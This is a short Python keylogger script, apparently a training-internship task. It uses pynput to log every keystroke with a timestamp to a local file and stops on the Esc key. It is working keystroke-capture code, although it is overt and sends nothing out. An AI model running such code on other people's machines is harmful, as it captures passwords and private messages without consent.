import pynput
from pynput.keyboard import Key, Listener
import datetime
import os

# Define the log file path
log_file_path = r"F:\Prodigy InfoTech\04\keylogger.txt"

# Create the log file directory if it doesn't exist
if not os.path.exists(os.path.dirname(log_file_path)):
    os.makedirs(os.path.dirname(log_file_path))

# Define the on_press function to log keystrokes with timestamps
def on_press(key):
    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    with open(log_file_path, "a") as f:
        f.write(f"{timestamp} - {str(key)}\n")

# Define the on_release function to stop logging when a key is released
def on_release(key):
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()